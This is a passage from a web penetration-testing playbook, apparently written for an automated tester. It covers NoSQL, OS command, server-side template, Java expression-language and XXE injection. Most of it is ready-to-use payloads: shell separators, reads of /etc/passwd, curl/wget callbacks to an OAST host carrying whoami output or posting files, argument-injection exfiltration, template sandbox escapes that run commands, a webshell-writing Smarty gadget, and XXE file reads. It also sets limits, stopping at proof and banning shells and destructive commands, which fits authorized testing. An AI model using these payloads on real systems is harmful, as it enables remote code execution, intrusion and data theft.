**Blind regex extraction.** Length first, then character by character.
```
{"user":"admin","pass":{"$regex":"^.{8}$"}}         length probe
{"user":"admin","pass":{"$regex":"^a"}}
{"user":"admin","pass":{"$regex":"^[a-m]"}}         binary search the charset
{"user":"admin","pass":{"$regex":"^\\$2b\\$"}}      is it a bcrypt hash
```
Form-encoded form: `user=admin&pass[$regex]=^a`. Anchor with `^` and `$`; without anchors every
substring matches and you get no oracle. Escape regex metacharacters in the known prefix.

**Other stores.**

CouchDB (Mango `_find`):
```json
{"selector":{"_id":{"$gt":null}}}
{"selector":{"password":{"$regex":"^a"}}}
{"selector":{"$or":[{"role":"admin"},{"role":"user"}]}}
```
Also test `/_all_dbs`, `/_users/_all_docs`, and `/<db>/_design/<d>/_view/<v>?startkey=` — `startkey`
/`endkey` accept JSON and are a range-bypass sink.

Redis (via a value that reaches a command, usually Lua or a naive client):
```
key\r\nINFO\r\n
key\r\nCONFIG GET *\r\n
"\r\nSCRIPT LOAD \"return 1\"\r\n"
```
RISK: `FLUSHALL`, `CONFIG SET dir`, `SLAVEOF`, `DEBUG SEGFAULT` are destruction/DoS. Never send them.
Proof stops at `INFO` or `PING` output appearing in the response. Redis is often reached through SSRF
with `gopher://` — see 3.11.

Elasticsearch / OpenSearch query DSL:
```
q=*
q=*:*
q=name:a* AND _exists_:password
q=*&fields=_source
{"query":{"bool":{"must_not":{"match_all":{}}}}}
{"query":{"query_string":{"query":"*","default_field":"*"}}}
{"query":{"regexp":{"password":"a.*"}}}
{"script_fields":{"x":{"script":{"source":"1+1","lang":"painless"}}}}
```
`script` / painless is the RCE-adjacent sink. Proof stops at `1+1` returning `2` or
`doc['_id']` echoing — do not run `Runtime.getRuntime()`. Also try `_search?size=1`, `_cat/indices`,
`_mapping` — that overlaps with `02-info-disclosure.md`.

**Confirm.**
1. Operator payload authenticates or returns records; the same request with a plain string does not.
2. `{"$ne":null}` vs `{"$eq":"definitely-not-a-value"}` must differ deterministically.
3. For regex extraction, extract 3+ characters of a known value (your own test account's field) to prove
   the oracle, then stop.
4. Save both requests.

**Escalate — stop at proof.**

| Step | Enough |
|---|---|
| Auth bypass | log in as your own second test account, or show the login returns a session for `{"$ne":null}` |
| Data access | record count via a filter that matches all, plus one record (yours) |
| Regex extraction | 3-4 characters of one field, then stop; state that full extraction is possible |
| JS sink | `$where` returning `1==1` true, or `$function` returning a computed value |
| Stop | no dumping collections, no `$out`/`$merge` (writes a new collection — destruction), no `mapReduce` with `out:` |

**Commonly missed.**
- The form-encoded path. Testers send JSON, the app also accepts `application/x-www-form-urlencoded`,
  and `user[$ne]=x` only works there. Try both content types on every JSON endpoint.
- Nested operator injection into *one* field while the rest of the body stays valid — many apps validate
  the top level only.
- Non-auth endpoints. Everyone tests login. `?filter[$ne]=` on a listing endpoint gives other tenants' rows.
- `$regex` as an information-disclosure oracle on fields the API never returns (password hashes, tokens).
- Sort and projection objects, not just filters.
- Mongo behind a GraphQL or REST DTO layer — the operator survives if the DTO is `any`/`Map<String,Object>`.
- Elasticsearch behind a search box: `*` and `*:*` are the whole-index test and look like typos in a log.
- Type juggling with arrays: `pass[]=x` makes a comparison against an array, which some drivers treat as
  a match against any element.

---

## 3.3 Command injection

**What it is.** Input reaches a shell or an exec call. Two families: **shell metacharacter** injection
(a shell is involved) and **argument injection** (no shell, but you control an argv element).

**Where it hides.**

| Feature | Binary usually behind it |
|---|---|
| Ping / traceroute / DNS lookup / port check "network tools" | `ping`, `dig`, `nslookup`, `nc` |
| Image resize, thumbnail, watermark, format convert | ImageMagick `convert`, `gm`, `ffmpeg` |
| PDF generation / HTML→PDF | `wkhtmltopdf`, `weasyprint`, `libreoffice`, `gs` |
| Video/audio transcode, duration probe | `ffmpeg`, `ffprobe` |
| Archive upload/extract, backup, export | `tar`, `unzip`, `zip`, `7z` |
| Git integration, repo import, webhook clone | `git` |
| Send-to-printer, send-email, `sendmail` wrapper | `sendmail`, `mail` |
| Antivirus / file type scan | `clamscan`, `file` |
| "Download from URL" / import feature | `curl`, `wget` |
| Log download, report render, cron-ish admin tools | `sh -c` |
| DNS/cert tooling, `openssl` wrappers | `openssl`, `certbot` |
| Filename itself on upload | any of the above invoked on the stored name |

Language sinks to grep for if you have source: PHP `exec/system/shell_exec/passthru/popen/proc_open`
and backticks; Node `child_process.exec`, `execSync`, `spawn` with `shell:true`; Python `os.system`,
`subprocess.*` with `shell=True`, `os.popen`, `commands.getoutput`; Java `Runtime.exec`,
`ProcessBuilder`, Groovy `"cmd".execute()`; Ruby backticks, `system`, `%x[]`, `open("|cmd")`,
`Kernel#spawn`; .NET `Process.Start` with `/c`; Go `exec.Command("sh","-c",...)`.

**Detect — separators.** Unix, append to a legitimate value:
```
;id
|id
||id
&&id
&id
`id`
$(id)
${IFS}id
%0aid
%0did
\nid
'id'
"id"
;id;
|| id #
&& id &
$(sleep 3)
;{id,}
```
Space-free variants for filters that block spaces:
```
;cat${IFS}/etc/passwd
;cat$IFS$9/etc/passwd
;{cat,/etc/passwd}
;cat</etc/passwd
;X=$'\x20';cat${X}/etc/passwd
;IFS=,;`cat<<<uname,-a`
```
Windows:
```
&whoami
|whoami
&&whoami
%0awhoami
;whoami            (PowerShell only)
$(whoami)          (PowerShell only)
`whoami`           (PowerShell)
&echo %USERNAME%
&ping -n 4 127.0.0.1
"&whoami&"
) & whoami
```
Filter evasion on Windows: `who^ami`, `wh""oami`, `w'h'oami`, `%COMSPEC% /c whoami`,
`for /f %a in ('whoami') do @echo %a`.

**Detect — blind.** Three channels, in preference order.

1. DNS/HTTP callback (best — works even with no output, no timing noise):
```
;nslookup CANARY.oast.fun
;curl http://CANARY.oast.fun/$(whoami)
;wget -q -O- http://CANARY.oast.fun/`id|base64 -w0`
;ping -c 1 CANARY.oast.fun
&nslookup CANARY.oast.fun            (Windows)
&ping -n 1 CANARY.oast.fun           (Windows)
;curl http://CANARY.oast.fun -d @/etc/hostname
&powershell -c "iwr http://CANARY.oast.fun/$env:USERNAME"
```
`interactsh-client` for the listener; see `03-bypass-and-blind.md`.

2. Timing:
```
;sleep 3
||sleep 3
&&sleep 3
$(sleep 3)
&ping -n 4 127.0.0.1&       (Windows, ~3s)
&timeout /t 3&              (Windows)
```
RISC of false positives is high on slow endpoints — baseline first, and cap at 3 probes per parameter.

3. Output in an error message, a generated filename, or the rendered artifact (e.g. `convert` writing the
   command output into an image's metadata).

**Detect — argument injection.** No shell needed. You control an argv element that starts with `-` or `--`.
This class is missed almost universally.

| Binary | Payload | Effect |
|---|---|---|
| `curl` | `-o /tmp/x http://CANARY.oast.fun` | arbitrary file write |
| `curl` | `-K /tmp/cfg` / `--config /etc/passwd` | read a config, error leaks content |
| `curl` | `--proxy http://CANARY.oast.fun:80` | SSRF / credential capture |
| `curl` | `-F 'a=@/etc/passwd' http://CANARY.oast.fun` | file exfil |
| `wget` | `--post-file=/etc/passwd http://CANARY.oast.fun` | file exfil |
| `wget` | `-O /var/www/html/x.php` | file write. RISK: do not. |
| `tar` | `--checkpoint=1 --checkpoint-action=exec=id` | command exec |
| `tar` | `--to-command=id` | command exec |
| `tar` | `--use-compress-program=id` | command exec |
| `zip` | `-TT 'id'` / `--unzip-command='id'` | command exec via test hook |
| `7z` | `-so @/etc/passwd` / `a x.7z -snl @/etc/passwd` | file read via listfile error |
| `git` | `--upload-pack='id'` on `clone`/`ls-remote` | command exec |
| `git` | `-c core.pager=id log` / `-c core.sshCommand='id'` | command exec |
| `git` | `--exec-path=/tmp` | hijack helper lookup |
| `ffmpeg` | input `concat:/etc/passwd` or an HLS playlist with `file:///etc/passwd` | file read |
| `ffmpeg` | `-i http://CANARY.oast.fun/x.m3u8` | SSRF |
| `ffprobe` | `-i` with `subfile,,start,0,end,1000,,:http://...` | range read / SSRF |
| ImageMagick `convert` | `-write /tmp/x`, `label:@/etc/passwd`, `text:/etc/passwd`, `-authenticate` | file read/write |
| ImageMagick | `msl:/tmp/x.msl`, `ephemeral:`, `mvg:`, `video:` coders | file ops / RCE (CVE-2016-3714 class) |
| `openssl` | `-in /etc/passwd` / `enc -in` | file read |
| `rsync` | `-e 'sh -c id'` | command exec |
| `ssh` | `-o ProxyCommand='id'` | command exec |
| `mysql` | `--defaults-extra-file=/tmp/x` | config hijack |
| `python` | `-c 'import os;os.system("id")'` | exec |
| `php` | `-r 'system("id");'` / `-d auto_prepend_file=...` | exec |
| `sendmail` | `-C/tmp/cf -X/tmp/out` | config hijack / log write |
| `find` | `-exec id ;` | exec |
| `awk`/`gawk` | `'BEGIN{system("id")}'` | exec |
| `perl` | `-e 'system("id")'`, `-pi -e` | exec / file write |
| `bash` | `-c id` | exec |

How to find the argument-injection sink: send a value that is only `--help`, `--version`, or
`-h`. If the response changes (different error, usage text, a longer body, a 500), something passed your
string to a binary as an argument.
```
--help
--version
-v
--
-
-o
--config=/dev/null
```
Also try a leading space then dash (`" --help"`), and `--` alone (which ends option parsing and often
changes behaviour visibly).

**ImageMagick/file-content variants** (upload-borne, no parameter needed) — an SVG or MVG file whose
content is the payload:
```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://CANARY.oast.fun/x)'
pop graphic-context
```
Upload as `x.mvg` and as `x.svg`; also try `x.jpg` with MVG content (coder is chosen by content).

**Confirm.**
1. Output of `id`/`whoami`/`hostname` appears, or an OOB hit lands with a canary bound to that exact
   (vector, payload) — see 3.23.
2. Re-run with a benign variant (`;true`) and show no callback/no delay.
3. Confirm you are not looking at the app resolving your hostname for a legitimate reason: a `ping`
   feature will always DNS-resolve your input. The proof is a **command** executing, e.g.
   `CANARY.oast.fun/$(whoami)` resolving with the username in the label, or a second unrelated command.

**Escalate — stop at proof.** `id`, `whoami`, `hostname`, `uname -a`, `pwd`, `env` (redact),
`cat /etc/passwd` if the program expects file-read evidence. That is the whole escalation.
Do not: write a webshell, add a user, start a reverse shell, read `/root/.ssh`, touch cloud metadata
from the shell, or enumerate the internal network (`../CLAUDE.md` 2, no lateral movement). If you need
to show impact, state the user context and whether it is root/container, and stop.

**Commonly missed.**
- Argument injection. Scanners send `;id` and nothing else. A `-` prefix with no metacharacter passes
  every metacharacter filter and every WAF rule.
- The upload filename. `foo;id.jpg`, `foo$(id).jpg`, `-o.jpg`, `--help.jpg` — the name is later passed
  to a converter.
- Second-order: name stored, then used by a nightly `ffmpeg`/`tar` job. OOB canary is the only way to see it.
- Windows targets. `;` does nothing in `cmd.exe`; `&` and `|` do. A "negative" result may be the wrong
  separator family.
- Newline-only injection: `%0a` works where `;` and `|` are blocked, because filters forget it.
- Blind with no timing and no output — the row is not negative until you tried an OOB callback
  (`../CLAUDE.md` 6.8).
- Injection into an env var the app later uses (`LD_PRELOAD`-adjacent, `GIT_*`, `PERL5OPT`, `PYTHONSTARTUP`,
  `BASH_ENV`, `NODE_OPTIONS=--require=...`). Look for params that set locale, timezone, or config.

---

## 3.4 Server-side template injection

**What it is.** Input is concatenated into a template *source* string, not passed as a template
variable. The engine then evaluates it.

**Where it hides.**

| Place | Notes |
|---|---|
| Name/greeting rendered into a page or email | `render_template_string("Hi "+name)` |
| Email/notification templates the user can edit | the intended feature, still an injection |
| Invoice, receipt, certificate, report generators | often Jinja2/Twig/Freemarker with user text |
| Error pages that echo your value | `Whitelabel Error Page` with your input in it |
| Subject/body of contact and invite forms | see 3.20 |
| Custom 404 pages, marketing banners, CMS blocks | admin-controlled → still in scope if you are admin on your own tenant |
| Filenames and URLs interpolated into template paths | template *path* injection, overlaps 3.10 |
| `?theme=`, `?template=`, `?view=`, `?layout=`, `?page=` | engine loads by name; controls which template renders |
| Localisation strings, i18n overrides | translations get rendered |
| Wiki/Markdown macros, BBCode | see 3.20 |

**Detect — polyglot first.** One request, then read which parts evaluated.
```
${{<%[%'"}}%\.
```
Then this ladder, in one value each:
```
${7*7}
{{7*7}}
<%= 7*7 %>
{7*7}
#{7*7}
${{7*7}}
{{7*'7'}}
@(7*7)
#set($x=7*7)$x
[[${7*7}]]
{% raw %}{{7*7}}{% endraw %}
*{7*7}
~{7*7}
%{7*7}
{{= 7*7 }}
{{7*7}}${7*7}<%=7*7%>#{7*7}
```
`49` in the response is a hit. Then split the `{{ }}` family with `{{7*'7'}}`:
`7777777` = **Jinja2** (Python string repetition), `49` = **Twig** (PHP casts `'7'` to a number).
That one probe splits the biggest branch of the tree.

**Identify.** Decision path:

| Probe | Result | Engine |
|---|---|---|
| `{{7*7}}` → 49 | then `{{7*'7'}}` → `7777777` | **Jinja2.** Python string repetition. Python-family only |
| `{{7*7}}` → 49 | then `{{7*'7'}}` → `49` | **Not yet Twig.** PHP *and* JS both coerce `'7'` to a number, so `49` means "PHP or JS semantics". Split it with the two rows below |
| ↳ `49` above, then `{{'a'.toUpperCase()}}` → `A`, or `{{[].constructor}}` → a function | native JS method resolved | **Nunjucks** or another JS-family engine |
| ↳ `49` above, then `{{'a'.toUpperCase()}}` errors while `{{'a'\|upper}}` → `A`, `{{_self}}` resolves | filter syntax, no JS methods | **Twig** |
| `{{7*7}}` → `{{7*7}}` literal, `{{#if 1}}y{{/if}}` → `y` | no arithmetic at all, block helpers work | **Handlebars / Mustache** — an arithmetic probe can never identify these |
| `${7*7}` → 49 | `${7*'7'}` errors, `${"freemarker.template.utility.Execute"?new()}` known | Freemarker |
| `${7*7}` → 49 | `#set($x=1)$x` → `1` | Velocity |
| `${7*7}` → 49 in a Spring app | `${T(java.lang.String)}` resolves | SpEL — see 3.5 |
| `[[${7*7}]]` → 49 | `__${7*7}__::.x` errors distinctly | Thymeleaf |
| `<%= 7*7 %>` → 49 | `<%= 1.class %>` → `Integer` | ERB (Ruby) |
| `<%= 7*7 %>` → 49 | `<%= System.Environment.MachineName %>` | ASP.NET (not Razor) |
| `@(7*7)` → 49 | | Razor |
| `{7*7}` → 49 | `{php}echo 1;{/php}`, `{$smarty.version}` | Smarty |
| `{{7*7}}` → 49 and it is Go | `{{.}}`, `{{printf "%s" .}}` | Go text/template (see note) |
| `${7*7}` → 49 and it is Python | `${"".__class__}` | Mako |
| `#{7*7}` → 49 | Ruby string interpolation reached | Ruby (ERB/Slim/Haml or raw `eval`) |
| `{7*7}` → 49 in Python | `{0.__class__}` | Python `str.format` — 3.4 note below |
| Pug: `#{7*7}` → 49, `= 7*7` on its own line | | Pug/Jade |

Go `text/template` does **not** do arithmetic: `{{7*7}}` errors. Test it with `{{.}}`,
`{{printf "%s" .}}`, `{{.Password}}`, and `{{range $k,$v := .}}{{$k}}{{end}}`. A Go SSTI is usually an
information-disclosure bug (dump the context struct) rather than RCE, unless `html/template` funcs are
custom. Cross-reference `02-info-disclosure.md`.

Python `str.format` / f-string sinks are SSTI-adjacent and reachable without any template engine:
```
{0.__class__}
{0.__class__.__mro__}
{0.__init__.__globals__}
{event.__init__.__globals__[SECRET_KEY]}
{user.__dict__}
{}.__class__
```

**Exploit per engine.** Minimum proof first (a computed value), then the sandbox escape only if the
program needs RCE proof. Every one of these stops at `id`.

Jinja2 (Python) — sandbox escape shape is "find an object, walk to a builtin, call it":
```
{{7*7}}
{{config}}
{{config.items()}}
{{self.__init__.__globals__.__builtins__}}
{{''.__class__.__mro__[1].__subclasses__()}}
{{cycler.__init__.__globals__.os.popen('id').read()}}
{{joiner.__init__.__globals__.os.popen('id').read()}}
{{namespace.__init__.__globals__.os.popen('id').read()}}
{{lipsum.__globals__['os'].popen('id').read()}}
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
{{url_for.__globals__['os'].popen('id').read()}}
{{get_flashed_messages.__globals__['os'].popen('id').read()}}
{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen('id').read()}}{% endif %}{% endfor %}
```
Filtered-character variants (no quotes, no dots, no underscores):
```
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')}}
{{()|attr(request.args.a)}}&a=__class__
{{request['application']['__globals__']}}
{{''['\x5f\x5fclass\x5f\x5f']}}
{{(lipsum|attr(request.args.g))|attr(request.args.i)(request.args.o)}}&g=__globals__&i=__getitem__&o=os
```

Twig (PHP):
```
{{7*7}}
{{_self}}
{{dump(app)}}
{{app.request.server.all|join(',')}}
{{['id']|filter('system')|join}}
{{['id']|map('system')|join}}
{{['id',0]|sort('system')|join}}
{{['id']|reduce('system')}}
{{[0]|reduce('system','id')}}
{{'id'|filter('passthru')}}
{% set x = 'system' %}{{x('id')}}
{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}
{{_self.env.setCache('ftp://CANARY/')}}{{_include('x')}}
```

Freemarker (Java):
```
${7*7}
${.version}
${"freemarker.template.utility.Execute"?new()("id")}
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
${"freemarker.template.utility.ObjectConstructor"?new()("java.lang.ProcessBuilder","id").start()}
${product.getClass().getProtectionDomain().getCodeSource().getLocation()}
<#assign v="freemarker.template.utility.ObjectConstructor"?new()>${v("java.io.File","/etc/passwd")}
${"foo"?api.class.getResource("/").getPath()}
```
Sandbox note: newer Freemarker blocks `?new` on `TemplateModel` classes; `?api` and
`getClass().getClassLoader()` chains are the escape route. If both are blocked, the bug is still a
read of the data model (`${.data_model}`) — report that.

Velocity (Java):
```
#set($x=7*7)$x
$class.inspect("java.lang.Runtime")
#set($e="e")$e.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("id")
#set($s="")#set($c=$s.class.forName("java.lang.Runtime"))#set($r=$c.getRuntime())$r.exec("id")
#set($p=$class.inspect("java.lang.Runtime").type.getRuntime().exec("id"))$p.waitFor()
#set($x=$class.inspect("java.io.File").type)$x
```

Thymeleaf / SpEL — see 3.5 for the full EL card; template-specific forms:
```
[[${7*7}]]
[[${T(java.lang.Runtime).getRuntime().exec('id')}]]
__${T(java.lang.Runtime).getRuntime().exec("id")}__::.x
${@java.lang.Runtime@getRuntime().exec('id')}
[(${#ctx.getClass()})]
```
Thymeleaf fragment/expression preprocessing (`__...__`) is the part filters miss. Also test the
*view name* — a controller returning `"user/"+name` gives you expression injection in the view name:
`name=__${T(java.lang.Runtime).getRuntime().exec("id")}__::.x`.

Handlebars (Node):
```
{{7*7}}                          -> literal, not a hit
{{#if 1}}y{{/if}}                -> y confirms Handlebars
{{#with "s" as |string|}}{{#with split as |conslist|}}{{this.pop}}{{this.push (lookup string.sub "constructor")}}{{this.pop}}{{#with string.split as |codelist|}}{{this.pop}}{{this.push "return require('child_process').execSync('id');"}}{{this.pop}}{{#each conslist}}{{#with (string.sub.apply 0 codelist)}}{{this}}{{/with}}{{/each}}{{/with}}{{/with}}{{/with}}
{{lookup (lookup this "constructor") "constructor"}}
```
Nunjucks (Node, Jinja-like syntax — do not confuse them):
```
{{7*7}}
{{range.constructor("return global.process.mainModule.require('child_process').execSync('id')")()}}
{{range.constructor("return this.process.env")()}}
```
Pug/Jade (Node):
```
#{7*7}
= 7*7
#{root.process.mainModule.require('child_process').execSync('id')}
- var x = global.process.mainModule.require('child_process').execSync('id')
#{function(){localLoad=global.process.mainModule.constructor._load;return localLoad("child_process").execSync("id")}()}
```
EJS (Node):
```
<%= 7*7 %>
<%= process.env %>
<%- global.process.mainModule.require('child_process').execSync('id') %>
settings['view options'][outputFunctionName]=x;s=require('child_process').execSync('id')//    (EJS 3 RCE via options)
```
ERB / Ruby:
```
<%= 7*7 %>
<%= 1.class %>
<%= File.open('/etc/passwd').read %>
<%= `id` %>
<%= IO.popen('id').read %>
<%= system('id') %>
<%= Kernel.send('`','id') %>
#{`id`}
#{7*7}
<%= ENV.to_h %>
```
Slim/Haml: `#{`id`}` and `= `id`` on their own line.

Smarty (PHP):
```
{$smarty.version}
{7*7}
{php}echo `id`;{/php}
{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['c']); ?>",self::clearConfig())}
{system('id')}
{['id']|@passthru}
{function name='x'}{system('id')}{/function}{x}
```
RISK: the `writeFile` gadget writes a webshell. Do not use it. `{php}` or `{system}` proves execution.

Razor (.NET):
```
@(7*7)
@System.Environment.MachineName
@{ var x = System.Diagnostics.Process.Start("cmd.exe","/c whoami"); }
@System.IO.File.ReadAllText("C:\\Windows\\win.ini")
@Html.Raw(7*7)
```
Classic ASP.NET / Web Forms (`<%= %>`) and `DataBinder.Eval` are separate sinks; also check ViewState
(3.7).

Mustache: logic-less. `{{7*7}}` never evaluates. A Mustache "SSTI" is almost always HTML injection →
go to 3.16. The exception is partial injection `{{>path}}` where the partial name is user-controlled →
that is template path traversal, 3.10.

Mako (Python):
```
${7*7}
${self.module.cache.util.os.system("id")}
<%import os%>${os.popen("id").read()}
${__import__('os').popen('id').read()}
<% import os %>${os.system('id')}
%if 1:
${os}
%endif
```
Jinja2-vs-Mako tell: `<%` blocks work in Mako, not Jinja2.

Go html/template context note: even without RCE, `{{.}}` dumps the whole data context, which is often
the whole user object including tokens. Report as injection with disclosure impact.

**Confirm.**
1. Arithmetic evaluated server-side (`{{7*7}}` → `49`) and the same input without the delimiters is
   echoed literally.
2. A second, different expression also evaluates (`{{8*8}}` → `64`) — rules out a coincidental `49`.
3. Server-side, not client-side: check the *raw* response body, not the rendered DOM. Angular/Vue
   `{{7*7}}` also renders `49` in the browser and that is 3.16, not this card.
4. For email/PDF sinks, the artifact itself is the evidence — save it.

**Escalate — stop at proof.** Ladder: expression evaluation → read a config/secret object
(`{{config}}`, `${.data_model}`, `@System.Environment`) → single command (`id`) if RCE is reachable.
That is the end. No file writes, no shells, no `/root/.ssh`. If the sandbox holds, the finding is
"SSTI with sandbox intact, reads application config" — still report it, do not discard it.

**Commonly missed.**
- Only the HTML page is tested. The same field renders into an email and a PDF with a *different* engine
  and no escaping (3.20, 3.21).
- `{{` is filtered, `${` is not — or the reverse. Always send both families plus `<%`, `#{`, `@(`.
- Template *path* / view *name* injection. `?template=`, `?theme=`, and any controller that builds a
  view name from input. Payload is a path (3.10) or a Thymeleaf expression, not `{{7*7}}`.
- Client-side vs server-side confusion: a `49` in a Vue app is CSTI (3.16). Read the raw body.
- The `7*7` probe alone. Freemarker/Velocity need `${}`/`#set`, Go needs `{{.}}`, Handlebars needs a block
  helper. A clean response to `{{7*7}}` proves very little.
- Second-order SSTI: stored profile field rendered by an admin dashboard template. Canary it (3.23).
- Sandbox "blocked" treated as negative. A blocked escape with a working `{{7*7}}` is a confirmed finding.

---

## 3.5 Expression language — EL / OGNL / SpEL / MVEL

**What it is.** A Java expression language evaluates your string. Distinct from SSTI because the sinks
are validation, configuration, and error handling — not templates.

**Where it hides.**

| Place | Stack |
|---|---|
| `.action` / `.do` URLs, any parameter name or value | Struts 2 OGNL |
| Struts `redirect:` / `redirectAction:` result params | OGNL (S2-016 class) |
| Struts `Content-Type` / `Content-Disposition` / `filename` on upload | OGNL (S2-046, S2-045) |
| Struts multipart `Content-Type` header | OGNL |
| Struts `?method:` / `?action:` prefixes | method invocation |
| Spring `@Value("#{...}")` with any externalised value you influence | SpEL |
| Spring Data `@Query` with SpEL `?#{...}`, `:#{...}` | SpEL |
| Spring Security `@PreAuthorize("hasRole('"+role+"')")` | SpEL |
| Bean-validation messages: `@Pattern(message = userInput)` or a message built from input | EL, CVE-2018-16621 class |
| `javax.validation` custom `buildConstraintViolationWithTemplate(input)` | EL |
| Spring Boot Whitelabel error page reflecting your value | SpEL via Thymeleaf |
| Spring Cloud Gateway actuator refresh, `spring.cloud.function.routing-expression` header | SpEL (CVE-2022-22963/22947) |
| Spring WebFlow, `flowExecutionKey`, SWF expressions | OGNL/SpEL |
| Camel `simple` language, `${header.x}` | Camel SimpleLanguage |
| MVEL in Drools / Activiti / Camunda rules and forms | MVEL |
| JSP EL in a page that concatenates input into `${}` | JSP EL |

**Detect.** Send each of these, look for arithmetic in the raw body:
```
${7*7}
#{7*7}
%{7*7}
${{7*7}}
@{7*7}
*{7*7}
%{1+1}
${'a'.concat('b')}
#{''.getClass()}
${pageContext}
%{#context}
```
Struts-specific probes (put in a *parameter name*, not just a value):
```
?%{7*7}=1
?class.classLoader.resources.context.parent.pipeline.first.pattern=x        (S2-057/Tomcat class)
?redirect:%{7*7}
?method:toString
?action:%{7*7}
```
Struts `Content-Type` header probe (S2-045):
```
Content-Type: %{(#test='multipart/form-data').(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#c=@java.lang.Runtime@getRuntime().exec('id'))}
```
Bean-validation EL probe — put this in any field with a `@Pattern`/`@Size`/`@Email` constraint and make
the validation fail:
```
${7*7}
${1+1}
${''.getClass().forName('java.lang.Runtime')}
```
If the error message comes back containing `49`, the message template is interpolating your input.

Safe SpEL identity probes (no exec):
```
#{7*7}
#{T(java.lang.System).getProperty('java.version')}
#{T(java.lang.System).getenv()}
#{systemProperties['user.name']}
#{T(java.lang.Class).forName('java.lang.Runtime')}
#{new java.io.File('.').getAbsolutePath()}
```
OGNL identity probes:
```
%{#application}
%{#session}
%{#request}
%{@java.lang.System@getProperty('user.name')}
%{@java.lang.System@getenv()}
%{#context['com.opensymphony.xwork2.dispatcher.HttpServletRequest'].getRequestURI()}
```
MVEL:
```
7*7
1+1
System.getProperty("user.name")
new java.lang.ProcessBuilder("id").start()
```

**Command execution forms** (for the single `id` proof only):
```
SpEL   #{T(java.lang.Runtime).getRuntime().exec('id')}
SpEL   #{new java.lang.ProcessBuilder('id').start()}
SpEL   #{new String(T(org.apache.commons.io.IOUtils).toByteArray(T(java.lang.Runtime).getRuntime().exec('id').getInputStream()))}
SpEL   T(java.lang.Runtime).getRuntime().exec(new String[]{'/bin/sh','-c','id'})
SpEL   #{T(java.net.InetAddress).getByName('CANARY.oast.fun')}        blind, no output needed
OGNL   %{(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(@java.lang.Runtime@getRuntime().exec('id'))}
OGNL   %{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess=#dm).(#p=new java.lang.ProcessBuilder({'id'})).(#p.redirectErrorStream(true)).(#pr=#p.start()).(#s=new java.util.Scanner(#pr.getInputStream()).useDelimiter('\\A')).(#s.hasNext()?#s.next():'')}
EL     ${''.getClass().forName('java.lang.Runtime').getMethod('getRuntime',null).invoke(null,null).exec('id')}
EL     ${request.getClass().getClassLoader().loadClass('java.lang.Runtime')...}
MVEL   new java.lang.ProcessBuilder("id").start()
```
`#{T(java.net.InetAddress).getByName('CANARY.oast.fun')}` is the best blind probe: DNS-only, no output
channel needed, no shell, and it is not DoS.

**Confirm.**
1. Two different arithmetic expressions both evaluate.
2. A Java-specific value returns that the app has no reason to echo (`java.version`, `user.name`).
3. Raw response body, not the DOM.
4. For blind EL, a DNS callback with a canary tied to that field (3.23).

**Escalate — stop at proof.** Evaluation → `java.version` / `user.name` / one env read (redact secrets
in the report, say "N env vars including AWS_*") → one `id`. Stop. Struts OGNL gives trivial full RCE;
do not use it beyond the single command. Do not touch `#_memberAccess` gadgets that also disable other
protections beyond what the proof needs.

**Commonly missed.**
- Bean-validation message interpolation. There is no template in sight; you have to *fail validation* to
  see it. Send `${7*7}` in a field that has a length or format constraint and read the error.
- Parameter *names* on Struts. `?%{7*7}=1` — nothing tests names (`00-surface-and-ledger.md` 2.3, rule 3).
- Headers. `Content-Type` on a multipart POST is a Struts OGNL sink. Nobody fuzzes `Content-Type` values.
- Spring Data SpEL in `@Query` — the injection is inside a "parameterised" query, so it looks safe.
- `#{}` vs `${}`: in Spring, `${}` is property placeholder, `#{}` is SpEL. Both are worth sending;
  `${}` can leak configuration properties even when SpEL is blocked.
- Error pages. The Whitelabel page reflecting a path segment is a Thymeleaf/SpEL sink.

---

## 3.6 XXE and XML injection

**What it is.** An XML parser resolves entities you define. Gives file read, SSRF, and sometimes RCE.
"XML injection" also covers breaking out of XML structure without entities.

**Where it hides.**

| Place | Notes |
|---|---|
| Any `Content-Type: application/xml` or `text/xml` endpoint | obvious one |
| Endpoints that take JSON — try sending XML instead | flip `Content-Type`, many parsers accept both |
| SOAP services, `.asmx`, `?wsdl`, `/services/` | classic |
| SAML `SAMLResponse` (base64 XML), SAML metadata upload | often a different parser from the app |
| File uploads: `.svg`, `.xml`, `.docx`/`.xlsx`/`.pptx` (OOXML is zipped XML), `.odt`, `.dwf`, `.xliff`, `.gpx`, `.kml`, `.plist`, `.wsdl`, `.xsd`, `.rss`, `.atom`, `.opml`, `.dtd` | parse-on-upload |
| RSS/Atom/sitemap/OPML importers, "import from URL" | fetches and parses attacker XML |
| XMLHttpRequest-ish REST APIs with `Accept: application/xml` | response side, but request parsing too |
| `Content-Type: application/x-www-form-urlencoded` endpoints that also accept XML bodies | |
| XML-RPC endpoints (`/xmlrpc.php`, `/RPC2`) | WordPress etc. |
| Excel/CSV import that goes via a spreadsheet library | OOXML path |
| PDF/image converters that read SVG or XMP metadata | |
| E-invoice / EDI / HL7v3 / ISO20022 / UBL uploads | heavily XML |

**Detect.** Step 1, does it parse XML at all and does it resolve internal entities (safe, no network):
```xml
<?xml version="1.0"?>
<!DOCTYPE r [<!ENTITY a "CANARYVALUE">]>
<r>&a;</r>
```
If `CANARYVALUE` comes back, entities resolve. If it errors with an entity-related message, note it.

Step 2, classic external file read:
```xml
<?xml version="1.0"?>
<!DOCTYPE r [<!ENTITY a SYSTEM "file:///etc/passwd">]>
<r>&a;</r>
```
```xml
<!DOCTYPE r [<!ENTITY a SYSTEM "file:///c:/windows/win.ini">]>
<r>&a;</r>
```
Files that work as proof without touching user data:
```
file:///etc/passwd
file:///etc/hostname
file:///etc/hosts
file:///proc/self/cmdline
file:///proc/self/environ
file:///proc/self/cwd/            (directory listing on some parsers)
file:///c:/windows/win.ini
file:///c:/windows/system32/drivers/etc/hosts
file:///                          (directory listing, Java parsers)
